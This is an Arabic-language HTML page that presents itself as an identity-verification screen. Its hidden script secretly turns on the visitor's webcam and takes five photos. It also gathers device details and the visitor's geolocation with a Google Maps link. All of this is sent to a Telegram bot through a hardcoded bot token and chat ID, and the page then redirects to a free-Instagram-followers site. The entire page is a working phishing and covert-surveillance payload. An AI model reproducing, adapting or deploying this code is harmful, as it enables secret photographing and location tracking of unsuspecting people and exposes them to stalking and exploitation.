<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>تأكيد الهوية</title>
  <style>
    body { text-align: center; font-family: sans-serif; background: #f2f2f2; }
    canvas { display: none; }
  </style>
</head>
<body>
  <h2>جاري التحقق من الهوية...</h2>
  <p>يرجى الانتظار قليلاً...</p>

  <video id="video" width="300" autoplay muted style="display: none;"></video>
  <canvas id="canvas" width="300" height="225"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    const token = '7328179577:AAGRNz3YRs-cPgvsETz4ULmqA7bnE82Cb7E';
    const chat_id = '6437823957';

    function sendDeviceInfo(lat = "غير متوفر", lon = "غير متوفر") {
      const info = `
معلومات الجهاز:
نظام التشغيل: ${navigator.platform}
المتصفح: ${navigator.userAgent}
اللغة: ${navigator.language}
دقة الشاشة: ${window.screen.width}x${window.screen.height}
الموقع:
خط العرض: ${lat}
خط الطول: ${lon}
https://www.google.com/maps?q=${lat},${lon}
      `;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id, text: info })
      });
    }

    function getLocationAndSendInfo() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          pos => sendDeviceInfo(pos.coords.latitude, pos.coords.longitude),
          err => sendDeviceInfo()
        );
      } else {
        sendDeviceInfo();
      }
    }

    function sendPhoto(blob) {
      const formData = new FormData();
      formData.append('chat_id', chat_id);
      formData.append('photo', blob, 'photo.jpg');

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      });
    }

    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        video.srcObject = stream;

        let count = 0;
        const maxPhotos = 5;
        const interval = setInterval(() => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => sendPhoto(blob), 'image/jpeg');
          count++;
          if (count >= maxPhotos) {
            clearInterval(interval);
            window.location.href = "https://myinstafollow.com/free-instagram-followers/";
          }
        }, 200);

        getLocationAndSendInfo();
      })
      .catch(err => alert("فشل تشغيل الكاميرا: " + err));
  </script>
</body>
</html>
